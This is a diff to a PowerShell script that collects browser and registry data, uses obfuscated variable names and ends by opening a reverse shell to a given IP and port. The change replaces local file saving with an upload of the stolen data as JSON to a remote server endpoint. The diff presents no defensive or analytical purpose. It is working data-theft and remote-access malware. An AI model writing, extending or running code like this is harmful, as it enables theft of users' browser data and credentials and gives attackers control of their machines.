@@ -1,6 +1,7 @@
 param (
     [string]$ip,
-    [int]$port
+    [int]$port,
+    [string]$serverUrl
 )
 
 # Obfuscated variable names
@@ -51,14 +52,15 @@ function Get-RegistryData {
     return $data
 }
 
-# Function to save data to a file
-function Save-Data {
+# Function to upload data to the server
+function Upload-Data {
     param (
         [hashtable]$data,
-        [string]$filePath
+        [string]$url
     )
 
-    $data | Out-File -FilePath $filePath
+    $jsonData = $data | ConvertTo-Json
+    Invoke-RestMethod -Uri $url -Method Post -Body $jsonData -ContentType "application/json"
 }
 
 # Main script execution
@@ -66,10 +68,14 @@ try {
     $browserData = Get-BrowserData
     $registryData = Get-RegistryData
 
-    # Save the collected data to a file
-    $dataFile = "C:\path\to\collected_data.txt"
-    Save-Data -data $browserData -filePath $dataFile
-    Save-Data -data $registryData -filePath $dataFile
+    # Combine the collected data
+    $allData = @{
+        BrowserData = $browserData
+        RegistryData = $registryData
+    }
+
+    # Upload the collected data to the server
+    Upload-Data -data $allData -url "$serverUrl/upload_endpoint"
 
     # Establish reverse shell connection
     $client = New-Object $Q($ip, $port)
